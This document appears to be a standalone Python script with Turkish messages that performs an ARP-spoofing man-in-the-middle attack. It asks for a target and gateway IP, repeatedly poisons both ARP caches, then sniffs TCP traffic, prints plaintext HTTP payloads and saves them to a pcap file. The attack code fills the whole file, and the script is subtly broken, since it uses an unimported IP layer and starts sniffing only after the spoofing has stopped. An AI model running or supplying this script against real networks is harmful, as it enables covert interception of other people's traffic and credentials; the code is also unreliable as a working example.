from scapy.all import ARP, Ether, send, srp, sniff, wrpcap, Raw, TCP
import time
import sys

def get_mac(ip, interface):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered_list = srp(arp_request, iface=interface, timeout=2, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] {ip} için ARP isteğine yanıt alınamadı.")
        sys.exit(1)

def spoof(target_ip, spoof_ip, interface):
    target_mac = get_mac(target_ip, interface)
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_response, iface=interface, verbose=False)

def restore(target_ip, gateway_ip, interface):
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(arp_response, iface=interface, verbose=False)
    print("[+] ARP Tabloları Düzeltildi")

def packet_callback(packet):
    if packet.haslayer(TCP):
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors="ignore")
            if "HTTP" in payload:
                print(f"\n[HTTP Paketi] {packet[IP].src} -> {packet[IP].dst}")
                print(payload)
        elif packet[TCP].dport == 443 or packet[TCP].sport == 443:
            print(f"[HTTPS Paketi] {packet[IP].src} -> {packet[IP].dst}")

def sniff_packets(interface, packet_count):
    print(f"[*] HTTP ve HTTPS trafiği dinleniyor... ({packet_count} paket yakalanacak)")
    packets = sniff(iface=interface, count=packet_count, prn=packet_callback, filter="tcp")
    wrpcap("captured_traffic.pcap", packets)
    print("[+] Paketler 'captured_traffic.pcap' dosyasına kaydedildi.")

def main():
    target_ip = input("[?] Hedef IP adresini girin: ")
    gateway_ip = input("[?] Ağ geçidi (gateway) IP adresini girin: ")
    interface = input("[?] Ağ arayüzünü girin (örneğin, eth0 veya wlan0): ")
    packet_count = int(input("[?] Kaç paket yakalamak istiyorsunuz: "))

    try:
        print("[*] MITM Saldırısı Başlıyor... (CTRL+C ile durdurabilirsiniz)")
        while True:
            spoof(target_ip, gateway_ip, interface)
            spoof(gateway_ip, target_ip, interface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Saldırı Durduruluyor...")
        restore(target_ip, gateway_ip, interface)
        sniff_packets(interface, packet_count)
        sys.exit(0)

if __name__ == "__main__":
    main()
